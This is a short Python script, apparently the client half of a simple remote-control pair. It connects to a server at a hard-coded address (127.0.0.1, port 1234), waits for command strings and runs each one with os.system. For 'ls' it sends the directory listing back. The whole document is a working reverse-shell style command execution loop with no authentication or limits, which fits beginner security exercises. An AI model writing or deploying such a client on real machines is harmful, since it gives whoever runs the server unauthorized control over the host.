import socket
import os
import time
import sys

host = '127.0.0.1'      # Server IP address
port = 1234             # Same port as in server

s = socket.socket()
s.connect((host,port))
print(f'Connected to {host}')

while True :
    command = s.recv(1024)
    command = command.decode()
    print(f'Command is : {command}')

    if command == 'ls':
        estr = ' '
        os.system(command)
        msg = os.listdir()
        msg = estr.join(msg)
        s.send(msg.encode())
    elif command == 'quit()':
        print(" --- End of Execution --- ")
        break

    else :
        os.system(command)
        s.send('Command executed'.encode())